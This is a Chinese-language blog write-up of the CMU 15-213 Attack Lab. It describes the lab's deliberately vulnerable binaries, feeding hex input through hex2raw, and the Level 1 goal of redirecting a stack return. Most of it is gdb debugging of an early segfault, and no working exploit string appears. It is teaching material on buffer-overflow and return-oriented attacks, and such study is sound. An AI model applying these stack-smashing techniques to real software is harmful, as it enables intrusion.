<!DOCTYPE html><html lang="zh-CN"> <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>CMU-15213-AttackLab | 我的博客</title></head> <body class="min-h-screen bg-gray-50 text-gray-900"> <header class="border-b border-gray-200 bg-white shadow-sm"> <div class="max-w-3xl mx-auto px-4 py-4"> <a href="/" class="text-blue-500 hover:underline">← 返回首页</a> </div> </header> <main class="max-w-3xl mx-auto px-4 py-8"> <article class="markdown-body"> <h1 class="text-3xl font-bold mb-2">CMU-15213-AttackLab</h1> <div class="text-sm text-gray-500 mb-6"> <time datetime="Mon Aug 18 2025 04:29:00 GMT+0800 (China Standard Time)">2025/8/18</time> </div> <div class="prose prose-lg max-w-none">  <article> <h1 id="cmu15213-attacklab">CMU15213-AttackLab</h1>
<h2 id="attacklab">AttackLab</h2>
<p>与BombLab类似，先看writeup，再看readme，最后看target中的readme
共计三个可执行文件 <code>hex2raw</code>，<code>ctarget</code>，<code>rtarget</code>。</p>
<p>writeup中先看<code>ctarget</code>文件。</p>
<p>在本地运行</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="shell"><code><span class="line"><span style="color:#B392F0">ubuntu@VM-0-8-ubuntu:~/learnning_project/CMU-15213/src/Attack-Lab$</span><span style="color:#9ECBFF"> ./ctarget</span><span style="color:#79B8FF"> -q</span></span>
<span class="line"><span style="color:#B392F0">Cookie:</span><span style="color:#79B8FF"> 0x59b997fa</span></span>
<span class="line"><span style="color:#B392F0">Ouch!:</span><span style="color:#9ECBFF"> You</span><span style="color:#9ECBFF"> caused</span><span style="color:#9ECBFF"> a</span><span style="color:#9ECBFF"> segmentation</span><span style="color:#9ECBFF"> fault!</span></span>
<span class="line"><span style="color:#B392F0">Better</span><span style="color:#9ECBFF"> luck</span><span style="color:#9ECBFF"> next</span><span style="color:#9ECBFF"> time</span></span>
<span class="line"><span style="color:#B392F0">FAIL:</span><span style="color:#9ECBFF"> Would</span><span style="color:#9ECBFF"> have</span><span style="color:#9ECBFF"> posted</span><span style="color:#9ECBFF"> the</span><span style="color:#9ECBFF"> following:</span></span>
<span class="line"><span style="color:#B392F0">        user</span><span style="color:#9ECBFF"> id</span><span style="color:#9ECBFF"> bovik</span></span>
<span class="line"><span style="color:#B392F0">        course</span><span style="color:#9ECBFF">  15213-f15</span></span>
<span class="line"><span style="color:#B392F0">        lab</span><span style="color:#9ECBFF">     attacklab</span></span>
<span class="line"><span style="color:#B392F0">        result</span><span style="color:#9ECBFF">  1:FAIL:0xffffffff:ctarget:0:</span></span></code></pre>
<p>error input1 // input sufficiently  short
<img src="https://s2.loli.net/2025/08/14/o7tH3iuDPR8Ufkr.png" alt="err1" loading="lazy" decoding="async" class="mx-auto rounded-lg shadow" srcset="https://s2.loli.net/2025/08/14/o7tH3iuDPR8Ufkr.png?w=640 640w, https://s2.loli.net/2025/08/14/o7tH3iuDPR8Ufkr.png?w=1280 1280w" sizes="(max-width: 768px) 100vw, 768px"></p>
<p>error input2 // input too long
<img src="https://s2.loli.net/2025/08/14/957KduTJO8chMiG.png" alt="err2" loading="lazy" decoding="async" class="mx-auto rounded-lg shadow" srcset="https://s2.loli.net/2025/08/14/957KduTJO8chMiG.png?w=640 640w, https://s2.loli.net/2025/08/14/957KduTJO8chMiG.png?w=1280 1280w" sizes="(max-width: 768px) 100vw, 768px"></p>
<p>correctly input
<img src="https://s2.loli.net/2025/08/14/INaRLVKm9ny5JPZ.png" alt="correct" loading="lazy" decoding="async" class="mx-auto rounded-lg shadow" srcset="https://s2.loli.net/2025/08/14/INaRLVKm9ny5JPZ.png?w=640 640w, https://s2.loli.net/2025/08/14/INaRLVKm9ny5JPZ.png?w=1280 1280w" sizes="(max-width: 768px) 100vw, 768px"></p>
<p>c/rtarget都是这样使用，其中
farm.c：目标“小工具农场”的源代码，您将使用它来生成面向返回的编程攻击。
cookie.txt：一个 8 位十六进制代码，您将用作攻击中的唯一标识符。
rtarget：易受面向返回编程攻击的可执行程序（ROP attack）
ctarget：易受代码注入攻击的可执行程序 (CI attack)
README.txt：描述目录内容的文件
hex2raw：生成攻击字符串的实用程序。</p>
<p><strong>漏洞利用字符串时不得在中间的任何位置包含0x0a</strong>，因为这是’\n’的ASCII值。gets()函数将默认认为打算终止字符串。</p>
<p>随后给出了两个可执行文件对应的level tasks summary
<img src="https://s2.loli.net/2025/08/14/LlFYaAOmRZfjVIW.png" alt="level summary" loading="lazy" decoding="async" class="mx-auto rounded-lg shadow" srcset="https://s2.loli.net/2025/08/14/LlFYaAOmRZfjVIW.png?w=640 640w, https://s2.loli.net/2025/08/14/LlFYaAOmRZfjVIW.png?w=1280 1280w" sizes="(max-width: 768px) 100vw, 768px"></p>
<p>本地使用，也就是自学时，使用<code>-q</code>参数跳过服务器过程</p>
<p>由于Attack Lab存在诸多国内正常CS课程不会教授的内容，因此，这里补充CourseNotes，若已经学过这一部分，请跳转至<a href="#%E8%AE%B0%E5%BD%95">记录</a></p>
<h2 id="coursenotes">CourseNotes</h2>
<p><a href="../course-note/05-09-machine.md">course-note 05-09-machine</a></p>
<h2 id="记录">记录</h2>
<p>首先<code>objdump -d &#x3C;file-name></code> dump出<code>ctarget</code>,<code>rtarget</code>的disassembly code <a href="../../../src/Attack-Lab/ctarget.d">ctarget.d</a>,<a href="../../../src/Attack-Lab/rtarget.d">rtarget.d</a>。</p>
<h3 id="level-1">Level 1</h3>
<p>任务并不需要注入新的代码，而是重定向程序区执行现存的过程</p>
<blockquote>
<p>Function getbuf is called within CTARGET by a function test having the following C code:</p>
<p><img src="https://s2.loli.net/2025/08/17/IcBte3RCQnFSND1.png" alt="test" loading="lazy" decoding="async" class="mx-auto rounded-lg shadow" srcset="https://s2.loli.net/2025/08/17/IcBte3RCQnFSND1.png?w=640 640w, https://s2.loli.net/2025/08/17/IcBte3RCQnFSND1.png?w=1280 1280w" sizes="(max-width: 768px) 100vw, 768px">
When getbuf executes its return statement (line 5 of getbuf), the program ordinarily resumes execution within function test (at line 5 of this function). We want to change this behavior. Within the file ctarget, there is code for a function touch1 having the following C representation:
<img src="https://s2.loli.net/2025/08/17/JGKwRTcDE2Hn8fZ.png" alt="touch1" loading="lazy" decoding="async" class="mx-auto rounded-lg shadow" srcset="https://s2.loli.net/2025/08/17/JGKwRTcDE2Hn8fZ.png?w=640 640w, https://s2.loli.net/2025/08/17/JGKwRTcDE2Hn8fZ.png?w=1280 1280w" sizes="(max-width: 768px) 100vw, 768px">
Your task is to get CTARGET to execute the code for touch1 when getbuf executes its return statement, rather than returning to test. Note that your exploit string may also corrupt parts of the stack not directly related to this stage, but this will not cause a problem, since touch1 causes the program to exit directly.</p>
</blockquote>
<p>简单的用中文说，就是将getbuf的ret改成执行touch1</p>
<p>我们先尝试执行一遍ctarget
向ctarget.l1.txt填入以下内容</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="txt"><code><span class="line"><span>ef be ad de</span></span></code></pre>
<p>然后执行命令</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="shell"><code><span class="line"><span style="color:#B392F0">ubuntu@VM-0-8-ubuntu:~/learnning_project/CMU-15213/src/Attack-Lab$</span><span style="color:#9ECBFF"> ./hex2raw</span><span style="color:#F97583"> &#x3C;</span><span style="color:#9ECBFF"> ctarget.l1.txt</span><span style="color:#F97583"> |</span><span style="color:#B392F0"> ./ctarget</span><span style="color:#79B8FF"> -q</span></span>
<span class="line"><span style="color:#B392F0">Cookie:</span><span style="color:#79B8FF"> 0x59b997fa</span></span>
<span class="line"><span style="color:#B392F0">Ouch!:</span><span style="color:#9ECBFF"> You</span><span style="color:#9ECBFF"> caused</span><span style="color:#9ECBFF"> a</span><span style="color:#9ECBFF"> segmentation</span><span style="color:#9ECBFF"> fault!</span></span>
<span class="line"><span style="color:#B392F0">Better</span><span style="color:#9ECBFF"> luck</span><span style="color:#9ECBFF"> next</span><span style="color:#9ECBFF"> time</span></span>
<span class="line"><span style="color:#B392F0">FAIL:</span><span style="color:#9ECBFF"> Would</span><span style="color:#9ECBFF"> have</span><span style="color:#9ECBFF"> posted</span><span style="color:#9ECBFF"> the</span><span style="color:#9ECBFF"> following:</span></span>
<span class="line"><span style="color:#B392F0">        user</span><span style="color:#9ECBFF"> id</span><span style="color:#9ECBFF"> bovik</span></span>
<span class="line"><span style="color:#B392F0">        course</span><span style="color:#9ECBFF">  15213-f15</span></span>
<span class="line"><span style="color:#B392F0">        lab</span><span style="color:#9ECBFF">     attacklab</span></span>
<span class="line"><span style="color:#B392F0">        result</span><span style="color:#9ECBFF">  1:FAIL:0xffffffff:ctarget:0:</span></span></code></pre>
<p>肯定是失败的，然后gdb看一下test函数</p>
<p>然后设计一下如何使用cgdb调试
基本上通过2种方式</p>
<ol>
<li>通过 run</li>
</ol>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="shell"><code><span class="line"><span style="color:#E1E4E8">(</span><span style="color:#B392F0">gdb</span><span style="color:#E1E4E8">) </span><span style="color:#B392F0">run</span><span style="color:#79B8FF"> -q</span><span style="color:#F97583"> &#x3C;</span><span style="color:#9ECBFF"> &#x3C;(</span><span style="color:#B392F0">./hex2raw</span><span style="color:#F97583"> &#x3C;</span><span style="color:#9ECBFF"> ctarget.l1.txt)</span></span></code></pre>
<blockquote>
<p>这里用到的<code>&#x3C;()</code>会将输出变为一个临时文件</p>
<p>相当于下面这个方式创建的中间文件</p>
</blockquote>
<ol start="2">
<li>通过中间文件</li>
</ol>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="shell"><code><span class="line"><span style="color:#B392F0">./hex2raw</span><span style="color:#F97583"> &#x3C;</span><span style="color:#9ECBFF"> ctarget.l1.txt</span><span style="color:#F97583"> ></span><span style="color:#9ECBFF"> payload.raw</span></span>
<span class="line"><span style="color:#E1E4E8">(</span><span style="color:#B392F0">gdb</span><span style="color:#E1E4E8">) </span><span style="color:#79B8FF">set</span><span style="color:#9ECBFF"> args</span><span style="color:#79B8FF"> -q</span></span>
<span class="line"><span style="color:#E1E4E8">(</span><span style="color:#B392F0">gdb</span><span style="color:#E1E4E8">) </span><span style="color:#B392F0">run</span><span style="color:#F97583"> &#x3C;</span><span style="color:#9ECBFF"> payload.raw</span></span></code></pre>
<p>这里我们就采用第一种方式</p>
<p><em><strong>这里遇到了两个小问题，通过gdb搞清楚了背后的原因，有一些小知识点，有关输入流和linux临时文件</strong></em>，如果你没有遇到该问题，可以跳转<a href="#gdb%E8%A7%A3%E5%86%B3%E4%BA%86%E8%AF%A5%E9%97%AE%E9%A2%98%E5%90%8E">gdb解决了该问题后</a></p>
<p>先不打断点运行看是否正常</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="shell"><code><span class="line"><span style="color:#E1E4E8">(</span><span style="color:#B392F0">gdb</span><span style="color:#E1E4E8">) </span><span style="color:#B392F0">run</span><span style="color:#79B8FF"> -q</span><span style="color:#F97583"> &#x3C;</span><span style="color:#9ECBFF"> &#x3C;(</span><span style="color:#B392F0">./hex2raw</span><span style="color:#F97583"> &#x3C;</span><span style="color:#9ECBFF"> ctarget.l1.txt)</span></span>
<span class="line"><span style="color:#B392F0">Starting</span><span style="color:#9ECBFF"> program:</span><span style="color:#9ECBFF"> /home/ubuntu/learnning_project/CMU-15213/src/Attack-Lab/ctarget</span><span style="color:#79B8FF"> -q</span><span style="color:#F97583"> &#x3C;</span><span style="color:#9ECBFF"> &#x3C;(</span><span style="color:#B392F0">./hex2raw</span><span style="color:#F97583"> &#x3C;</span><span style="color:#9ECBFF"> ctarget.l1.txt)</span></span>
<span class="line"><span style="color:#E1E4E8">[Thread debugging using libthread_db enabled]</span></span>
<span class="line"><span style="color:#B392F0">Using</span><span style="color:#9ECBFF"> host</span><span style="color:#9ECBFF"> libthread_db</span><span style="color:#9ECBFF"> library</span><span style="color:#9ECBFF"> "/lib/x86_64-linux-gnu/libthread_db.so.1".</span></span>
<span class="line"><span style="color:#B392F0">Cookie:</span><span style="color:#79B8FF"> 0x59b997fa</span></span>
<span class="line"></span>
<span class="line"><span style="color:#B392F0">Program</span><span style="color:#9ECBFF"> received</span><span style="color:#9ECBFF"> signal</span><span style="color:#9ECBFF"> SIGSEGV,</span><span style="color:#9ECBFF"> Segmentation</span><span style="color:#9ECBFF"> fault.</span></span>
<span class="line"><span style="color:#B392F0">0x00007ffff7dff0d0</span><span style="color:#9ECBFF"> in</span><span style="color:#9ECBFF"> __vfprintf_internal</span><span style="color:#E1E4E8"> (s=0x7ffff7fa5780 </span><span style="color:#F97583">&#x3C;</span><span style="color:#9ECBFF">_IO_2_1_stdout</span><span style="color:#E1E4E8">_</span><span style="color:#F97583">></span><span style="color:#9ECBFF">,</span><span style="color:#9ECBFF"> format=</span><span style="color:#79B8FF">0x4032b4</span><span style="color:#9ECBFF"> "Type string:",</span><span style="color:#9ECBFF"> ap=ap@entry=0x5561dbd8,</span><span style="color:#9ECBFF"> mode_flags=mode_flags@entry=</span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">) at ./stdio-common/vfprintf-internal.c:1244</span></span>
<span class="line"><span style="color:#B392F0">1244</span><span style="color:#9ECBFF">    ./stdio-common/vfprintf-internal.c:</span><span style="color:#9ECBFF"> No</span><span style="color:#9ECBFF"> such</span><span style="color:#9ECBFF"> file</span><span style="color:#9ECBFF"> or</span><span style="color:#9ECBFF"> directory.</span></span></code></pre>
<p>我们直接<code>c</code></p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="shell"><code><span class="line"><span style="color:#E1E4E8">(</span><span style="color:#B392F0">gdb</span><span style="color:#E1E4E8">) </span><span style="color:#B392F0">c</span></span>
<span class="line"><span style="color:#B392F0">Continuing.</span></span>
<span class="line"><span style="color:#B392F0">Ouch!:</span><span style="color:#9ECBFF"> You</span><span style="color:#9ECBFF"> caused</span><span style="color:#9ECBFF"> a</span><span style="color:#9ECBFF"> segmentation</span><span style="color:#9ECBFF"> fault!</span></span>
<span class="line"><span style="color:#B392F0">Better</span><span style="color:#9ECBFF"> luck</span><span style="color:#9ECBFF"> next</span><span style="color:#9ECBFF"> time</span></span>
<span class="line"><span style="color:#B392F0">FAIL:</span><span style="color:#9ECBFF"> Would</span><span style="color:#9ECBFF"> have</span><span style="color:#9ECBFF"> posted</span><span style="color:#9ECBFF"> the</span><span style="color:#9ECBFF"> following:</span></span>
<span class="line"><span style="color:#B392F0">        user</span><span style="color:#9ECBFF"> id</span><span style="color:#9ECBFF"> bovik</span></span>
<span class="line"><span style="color:#B392F0">        course</span><span style="color:#9ECBFF">  15213-f15</span></span>
<span class="line"><span style="color:#B392F0">        lab</span><span style="color:#9ECBFF">     attacklab</span></span>
<span class="line"><span style="color:#B392F0">        result</span><span style="color:#9ECBFF">  1:FAIL:0xffffffff:ctarget:0:</span></span>
<span class="line"><span style="color:#E1E4E8">[Inferior </span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8"> (process </span><span style="color:#79B8FF">1553765</span><span style="color:#E1E4E8">) exited with code 01]</span></span></code></pre>
<p>再尝试b test,然后运行，发现还是一样。
我们看一下cgdb爆出一堆奇怪东西的bt</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="shell"><code><span class="line"><span style="color:#E1E4E8">(</span><span style="color:#B392F0">gdb</span><span style="color:#E1E4E8">) </span><span style="color:#B392F0">bt</span></span>
<span class="line"><span style="color:#6A737D">#0  0x00007ffff7dff0d0 in __vfprintf_internal (s=0x7ffff7fa5780 &#x3C;_IO_2_1_stdout_>, format=0x4032b4 "Type string:",</span></span>
<span class="line"><span style="color:#E1E4E8">    ap</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">ap@</span><span style="color:#E1E4E8">entry</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">0x5561dbd8,</span><span style="color:#E1E4E8"> mode_flags</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">mode_flags@</span><span style="color:#E1E4E8">entry</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">2</span><span style="color:#E1E4E8">) at ./stdio-common/vfprintf-internal.c:1244</span></span>
<span class="line"><span style="color:#6A737D">#1  0x00007ffff7ebec4b in ___printf_chk (flag=flag@entry=1, format=format@entry=0x4032b4 "Type string:") at ./debug/printf_chk.c:33</span></span>
<span class="line"><span style="color:#6A737D">#2  0x0000000000401f10 in printf (__fmt=0x4032b4 "Type string:") at /usr/include/x86_64-linux-gnu/bits/stdio2.h:105</span></span>
<span class="line"><span style="color:#6A737D">#3  launch (offset=&#x3C;optimized out>) at support.c:293</span></span>
<span class="line"><span style="color:#6A737D">#4  0x0000000000401ffa in stable_launch (offset=&#x3C;optimized out>) at support.c:340</span></span></code></pre>
<p>可见在stable_launch就挂在奇怪的地方了</p>
<p>加两个断点<code>main</code>和<code>stable_launch</code>
一步步调试，发现根本没有进入test函数，猜测输入有问题，于是可以尝试</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="shell"><code><span class="line"><span style="color:#B392F0">./hex2raw</span><span style="color:#9ECBFF"> c</span><span style="color:#F97583">&#x3C;</span><span style="color:#9ECBFF"> target.l1.txt</span></span></code></pre>
<p>发现没有输入，这里记得最后输入一个回车：）</p>
<p>但是仍然没有作用，尝试分析一下dump文件，可见test启动于launch函数，而launch函数被stable_launch调用，程序应该是在launch调用test前就已经segment fault导致触发了一系列的输出。</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="shell"><code><span class="line"><span style="color:#B392F0"> 1│</span><span style="color:#9ECBFF"> Dump</span><span style="color:#9ECBFF"> of</span><span style="color:#9ECBFF"> assembler</span><span style="color:#9ECBFF"> code</span><span style="color:#9ECBFF"> for</span><span style="color:#9ECBFF"> function</span><span style="color:#9ECBFF"> launch:</span></span>
<span class="line"><span style="color:#B392F0"> 2│</span><span style="color:#9ECBFF"> support.c:</span></span>
<span class="line"><span style="color:#B392F0"> 3│</span><span style="color:#79B8FF"> 285</span><span style="color:#9ECBFF">     in</span><span style="color:#9ECBFF"> support.c</span></span>
<span class="line"><span style="color:#B392F0"> 4│</span><span style="color:#79B8FF">    0x0000000000401eb4</span><span style="color:#F97583"> &#x3C;</span><span style="color:#9ECBFF">+</span><span style="color:#F97583">0></span><span style="color:#9ECBFF">:</span><span style="color:#9ECBFF">     push</span><span style="color:#9ECBFF">   %rbp</span></span>
<span class="line"><span style="color:#B392F0"> 5│</span><span style="color:#79B8FF">    0x0000000000401eb5</span><span style="color:#F97583"> &#x3C;</span><span style="color:#9ECBFF">+</span><span style="color:#F97583">1></span><span style="color:#9ECBFF">:</span><span style="color:#9ECBFF">     mov</span><span style="color:#9ECBFF">    %rsp,%rbp</span></span>
<span class="line"><span style="color:#B392F0"> 6│</span><span style="color:#79B8FF">    0x0000000000401eb8</span><span style="color:#F97583"> &#x3C;</span><span style="color:#9ECBFF">+</span><span style="color:#F97583">4></span><span style="color:#9ECBFF">:</span><span style="color:#9ECBFF">     sub</span><span style="color:#E1E4E8">    $0x10</span><span style="color:#9ECBFF">,%rsp</span></span>
<span class="line"><span style="color:#B392F0"> 7│</span><span style="color:#79B8FF">    0x0000000000401ebc</span><span style="color:#F97583"> &#x3C;</span><span style="color:#9ECBFF">+</span><span style="color:#F97583">8></span><span style="color:#9ECBFF">:</span><span style="color:#9ECBFF">     mov</span><span style="color:#9ECBFF">    %rdi,%rdx</span></span>
<span class="line"><span style="color:#B392F0"> 8│</span><span style="color:#79B8FF">    0x0000000000401ebf</span><span style="color:#F97583"> &#x3C;</span><span style="color:#9ECBFF">+1</span><span style="color:#F97583">1></span><span style="color:#9ECBFF">:</span><span style="color:#9ECBFF">    mov</span><span style="color:#9ECBFF">    %fs:0x28,%rax</span></span>
<span class="line"><span style="color:#B392F0"> 9│</span><span style="color:#79B8FF">    0x0000000000401ec8</span><span style="color:#F97583"> &#x3C;</span><span style="color:#9ECBFF">+2</span><span style="color:#F97583">0></span><span style="color:#9ECBFF">:</span><span style="color:#9ECBFF">    mov</span><span style="color:#9ECBFF">    %rax,-0x8</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">%rbp</span><span style="color:#E1E4E8">)</span></span>
<span class="line"><span style="color:#B392F0">10│</span><span style="color:#79B8FF">    0x0000000000401ecc</span><span style="color:#F97583"> &#x3C;</span><span style="color:#9ECBFF">+2</span><span style="color:#F97583">4></span><span style="color:#9ECBFF">:</span><span style="color:#9ECBFF">    xor</span><span style="color:#9ECBFF">    %eax,%eax</span></span>
<span class="line"><span style="color:#B392F0">11│</span></span>
<span class="line"><span style="color:#B392F0">12│</span><span style="color:#79B8FF"> 286</span><span style="color:#9ECBFF">     in</span><span style="color:#9ECBFF"> support.c</span></span>
<span class="line"><span style="color:#B392F0">13│</span><span style="color:#79B8FF">    0x0000000000401ece</span><span style="color:#F97583"> &#x3C;</span><span style="color:#9ECBFF">+2</span><span style="color:#F97583">6></span><span style="color:#9ECBFF">:</span><span style="color:#9ECBFF">    lea</span><span style="color:#79B8FF">    0x1e</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">%rdi</span><span style="color:#E1E4E8">)</span><span style="color:#9ECBFF">,%rax</span></span>
<span class="line"><span style="color:#B392F0">14│</span><span style="color:#79B8FF">    0x0000000000401ed2</span><span style="color:#F97583"> &#x3C;</span><span style="color:#9ECBFF">+3</span><span style="color:#F97583">0></span><span style="color:#9ECBFF">:</span><span style="color:#9ECBFF">    and</span><span style="color:#E1E4E8">    $0xfffffffffffffff0</span><span style="color:#9ECBFF">,%rax</span></span>
<span class="line"><span style="color:#B392F0">15│</span><span style="color:#79B8FF">    0x0000000000401ed6</span><span style="color:#F97583"> &#x3C;</span><span style="color:#9ECBFF">+3</span><span style="color:#F97583">4></span><span style="color:#9ECBFF">:</span><span style="color:#9ECBFF">    sub</span><span style="color:#9ECBFF">    %rax,%rsp</span></span>
<span class="line"><span style="color:#B392F0">16│</span><span style="color:#79B8FF">    0x0000000000401ed9</span><span style="color:#F97583"> &#x3C;</span><span style="color:#9ECBFF">+3</span><span style="color:#F97583">7></span><span style="color:#9ECBFF">:</span><span style="color:#9ECBFF">    lea</span><span style="color:#79B8FF">    0xf</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">%rsp</span><span style="color:#E1E4E8">)</span><span style="color:#9ECBFF">,%rdi</span></span>
<span class="line"><span style="color:#B392F0">17│</span><span style="color:#79B8FF">    0x0000000000401ede</span><span style="color:#F97583"> &#x3C;</span><span style="color:#9ECBFF">+4</span><span style="color:#F97583">2></span><span style="color:#9ECBFF">:</span><span style="color:#9ECBFF">    and</span><span style="color:#E1E4E8">    $0xfffffffffffffff0</span><span style="color:#9ECBFF">,%rdi</span></span>
<span class="line"><span style="color:#B392F0">18│</span></span>
<span class="line"><span style="color:#B392F0">19│</span><span style="color:#9ECBFF"> /usr/include/x86_64-linux-gnu/bits/string3.h:</span></span>
<span class="line"><span style="color:#B392F0">20│</span><span style="color:#79B8FF">    0x0000000000401ee2</span><span style="color:#F97583"> &#x3C;</span><span style="color:#9ECBFF">+4</span><span style="color:#F97583">6></span><span style="color:#9ECBFF">:</span><span style="color:#9ECBFF">    mov</span><span style="color:#E1E4E8">    $0xf4</span><span style="color:#9ECBFF">,%esi</span></span>
<span class="line"><span style="color:#B392F0">21│</span><span style="color:#79B8FF">    0x0000000000401ee7</span><span style="color:#F97583"> &#x3C;</span><span style="color:#9ECBFF">+5</span><span style="color:#F97583">1></span><span style="color:#9ECBFF">:</span><span style="color:#9ECBFF">    call</span><span style="color:#79B8FF">   0x400d00</span><span style="color:#F97583"> &#x3C;</span><span style="color:#9ECBFF">memset@pl</span><span style="color:#E1E4E8">t</span><span style="color:#F97583">></span></span>
<span class="line"><span style="color:#B392F0">22│</span></span>
<span class="line"><span style="color:#B392F0">23│</span><span style="color:#9ECBFF"> support.c:</span></span>
<span class="line"><span style="color:#B392F0">24│</span><span style="color:#79B8FF">    0x0000000000401eec</span><span style="color:#F97583"> &#x3C;</span><span style="color:#9ECBFF">+5</span><span style="color:#F97583">6></span><span style="color:#9ECBFF">:</span><span style="color:#9ECBFF">    mov</span><span style="color:#79B8FF">    0x2025ad</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">%rip</span><span style="color:#E1E4E8">)</span><span style="color:#9ECBFF">,%rax</span><span style="color:#6A737D">        # 0x6044a0 &#x3C;stdin@@GLIBC_2.2.5></span></span>
<span class="line"><span style="color:#B392F0">25│</span><span style="color:#79B8FF">    0x0000000000401ef3</span><span style="color:#F97583"> &#x3C;</span><span style="color:#9ECBFF">+6</span><span style="color:#F97583">3></span><span style="color:#9ECBFF">:</span><span style="color:#9ECBFF">    cmp</span><span style="color:#9ECBFF">    %rax,0x2025d6</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">%rip</span><span style="color:#E1E4E8">)        </span><span style="color:#6A737D"># 0x6044d0 &#x3C;infile></span></span>
<span class="line"><span style="color:#B392F0">26├──</span><span style="color:#E1E4E8">> </span><span style="color:#79B8FF">0x0000000000401efa</span><span style="color:#F97583"> &#x3C;</span><span style="color:#9ECBFF">+7</span><span style="color:#F97583">0></span><span style="color:#9ECBFF">:</span><span style="color:#9ECBFF">    jne</span><span style="color:#79B8FF">    0x401f10</span><span style="color:#F97583"> &#x3C;</span><span style="color:#9ECBFF">launch+9</span><span style="color:#F97583">2></span></span></code></pre>
<p>最终在infile launch+70行发现了the root fault，继续<code>si</code>结果如下。</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="shell"><code><span class="line"><span style="color:#E1E4E8">(</span><span style="color:#B392F0">gdb</span><span style="color:#E1E4E8">) </span><span style="color:#B392F0">si</span></span>
<span class="line"><span style="color:#79B8FF">printf</span><span style="color:#E1E4E8"> (__fmt=0x4032b4 </span><span style="color:#9ECBFF">"Type string:"</span><span style="color:#E1E4E8">) at /usr/include/x86_64-linux-gnu/bits/stdio2.h:105</span></span>
<span class="line"><span style="color:#B392F0">105</span><span style="color:#9ECBFF">       return</span><span style="color:#9ECBFF"> __fprintf_chk</span><span style="color:#E1E4E8"> (__stream, </span><span style="color:#9ECBFF">__USE_FORTIFY_LEVEL</span><span style="color:#9ECBFF"> -</span><span style="color:#9ECBFF"> 1,</span><span style="color:#9ECBFF"> __fmt,</span></span>
<span class="line"><span style="color:#E1E4E8">(</span><span style="color:#B392F0">gdb</span><span style="color:#E1E4E8">) </span><span style="color:#B392F0">bt</span></span>
<span class="line"><span style="color:#6A737D">#0  printf (__fmt=0x4032b4 "Type string:") at /usr/include/x86_64-linux-gnu/bits/stdio2.h:105</span></span>
<span class="line"><span style="color:#6A737D">#1  launch (offset=&#x3C;optimized out>) at support.c:293</span></span>
<span class="line"><span style="color:#6A737D">#2  0x0000000000401ffa in stable_launch (offset=&#x3C;optimized out>) at support.c:340</span></span>
<span class="line"><span style="color:#B392F0">Backtrace</span><span style="color:#9ECBFF"> stopped:</span><span style="color:#9ECBFF"> Cannot</span><span style="color:#9ECBFF"> access</span><span style="color:#9ECBFF"> memory</span><span style="color:#9ECBFF"> at</span><span style="color:#9ECBFF"> address</span><span style="color:#79B8FF"> 0x55686000</span></span></code></pre>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="shell"><code><span class="line"><span style="color:#6A737D"># ifdef __va_arg_pack</span></span>
<span class="line"><span style="color:#B392F0">102│</span><span style="color:#9ECBFF"> __fortify_function</span><span style="color:#9ECBFF"> int</span></span>
<span class="line"><span style="color:#B392F0">103│</span><span style="color:#9ECBFF"> fprintf</span><span style="color:#E1E4E8"> (FILE </span><span style="color:#79B8FF">*</span><span style="color:#9ECBFF">__restrict</span><span style="color:#9ECBFF"> __stream,</span><span style="color:#9ECBFF"> const</span><span style="color:#9ECBFF"> char</span><span style="color:#79B8FF"> *</span><span style="color:#9ECBFF">__restrict</span><span style="color:#9ECBFF"> __fmt,</span><span style="color:#9ECBFF"> ...</span><span style="color:#E1E4E8">)</span></span>
<span class="line"><span style="color:#B392F0">104│</span><span style="color:#9ECBFF"> {</span></span>
<span class="line"><span style="color:#B392F0">105├─</span><span style="color:#E1E4E8">> </span><span style="color:#9ECBFF">return</span><span style="color:#9ECBFF"> __fprintf_chk</span><span style="color:#E1E4E8"> (__stream, </span><span style="color:#9ECBFF">__USE_FORTIFY_LEVEL</span><span style="color:#9ECBFF"> -</span><span style="color:#9ECBFF"> 1,</span><span style="color:#9ECBFF"> __fmt,</span></span>
<span class="line"><span style="color:#B392F0">106│</span><span style="color:#9ECBFF">                         __va_arg_pack</span><span style="color:#E1E4E8"> ());</span></span>
<span class="line"><span style="color:#B392F0">107│</span><span style="color:#9ECBFF"> }</span></span></code></pre>
